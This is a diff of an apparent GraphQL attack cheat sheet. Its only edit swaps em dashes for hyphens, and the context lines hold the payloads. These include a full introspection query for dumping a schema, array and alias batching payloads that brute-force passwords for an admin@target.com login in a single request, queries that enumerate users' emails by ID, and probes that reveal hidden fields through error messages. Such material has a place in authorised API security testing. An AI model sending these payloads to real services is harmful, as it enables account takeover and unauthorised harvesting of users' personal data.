@@ -6,7 +6,7 @@
 # 1. FULL INTROSPECTION QUERY
 # ============================================================
 
-# Full schema dump — paste as the "query" value in JSON POST body
+# Full schema dump - paste as the "query" value in JSON POST body
 {__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name description fields(includeDeprecated:true){name description args{name description type{...TypeRef}defaultValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{name description type{...TypeRef}defaultValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
 
 # curl command:
@@ -69,7 +69,7 @@ GET /graphql?query={__schema{types{name}}}
 # 4. QUERY BATCHING ATTACKS
 # ============================================================
 
-# Array batching — multiple queries in one request
+# Array batching - multiple queries in one request
 [
   {"query": "{ user(id: 1) { email } }"},
   {"query": "{ user(id: 2) { email } }"},
@@ -94,7 +94,7 @@ GET /graphql?query={__schema{types{name}}}
   {"query": "mutation { login(email: \"admin@target.com\", password: \"123456\") { token } }"}
 ]
 
-# Alias batching — multiple operations in one query
+# Alias batching - multiple operations in one query
 {
   "query": "mutation { a1: login(email: \"admin@target.com\", password: \"pass1\") { token } a2: login(email: \"admin@target.com\", password: \"pass2\") { token } a3: login(email: \"admin@target.com\", password: \"pass3\") { token } }"
 }
@@ -126,7 +126,7 @@ GET /graphql?query={__schema{types{name}}}
 {"query": "{ user(id: 1) { __typename id _id internalId debug _debug } }"}
 
 # Enumerate via error messages
-# Send an invalid field — the error might suggest valid ones
+# Send an invalid field - the error might suggest valid ones
 {"query": "{ user(id: 1) { nonexistent_field } }"}
 
 # ============================================================
